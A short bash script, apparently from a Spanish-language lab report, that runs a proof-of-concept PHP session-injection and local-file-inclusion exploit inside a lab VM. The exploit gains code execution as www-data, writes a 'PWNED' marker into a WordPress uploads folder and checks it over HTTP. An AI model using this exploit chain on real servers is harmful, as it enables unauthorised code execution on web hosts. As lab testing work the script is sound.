#!/usr/bin/env bash
# chain-a-full.sh — Chain A completa: RCE www-data + marcador en M1.
set -uo pipefail
cd "$(dirname "$0")/../.." || exit 1

./informe/tools/vm.sh m1 '
cd ~/tools/php2shell-poc/exploit || exit 1
python3 chain_a_session_lfi.py \
  --host 127.0.0.1 --port 80 \
  --inject-path /index.php \
  --lfi-path /lfi.php \
  --session-path /tmp \
  --command "id; hostname; echo PWNED-M1-www-data > /var/www/wp/wp-content/uploads/PWNED-M1.txt; ls -l /var/www/wp/wp-content/uploads/PWNED-M1.txt" \
  --cleanup-on --attempts 3
'
echo
echo "== Marcador por HTTP =="
curl -s http://10.10.10.11/wp-content/uploads/PWNED-M1.txt
